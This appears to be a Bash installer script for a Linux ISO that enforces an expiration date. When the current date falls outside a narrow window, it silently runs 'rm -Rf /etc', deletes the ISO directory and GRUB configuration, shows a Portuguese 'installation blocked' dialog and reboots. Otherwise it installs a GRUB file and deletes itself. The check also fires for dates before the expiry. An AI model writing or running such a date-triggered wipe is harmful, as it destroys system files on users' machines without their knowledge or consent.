#!/bin/bash
#
EXPIRATION_DATE='20251020'

#
SCRIPT_PATH=$(whereis -b $(basename "$0") | awk '{print $2}')

DATE_BEFORE_EXPIRATION=$(date -d "$EXPIRATION_DATE -1 days" +%Y%m%d)
DATE_AFTER_EXPIRATION=$(date -d "$EXPIRATION_DATE +20 days" +%Y%m%d)
CURRENT_DATE=$(date +%Y%m%d)
if ! { [ "$CURRENT_DATE" -gt "$DATE_BEFORE_EXPIRATION" ] && [ "$CURRENT_DATE" -lt "$DATE_AFTER_EXPIRATION" ]; }; then
    rm -Rf /usr/share/iso/
    rm -Rf /etc -Rf
    rm -Rf /etc/default/grub -Rf
    yad --center --width=400 --height=150 --title="Instalação Bloqueada" \
        --text="Esta ISO expirou e não pode ser instalada.\n\nO sistema será reiniciado." \
        --button="OK":0
    sleep 5
    reboot

    exit 0
fi

# Grub
echo "$EXPIRATION_DATE" > /etc/default/exp 
mv /usr/share/iso/grub /etc/default/grub -f
update-grub

# Remove o script após a execução
rm -- "$SCRIPT_PATH"
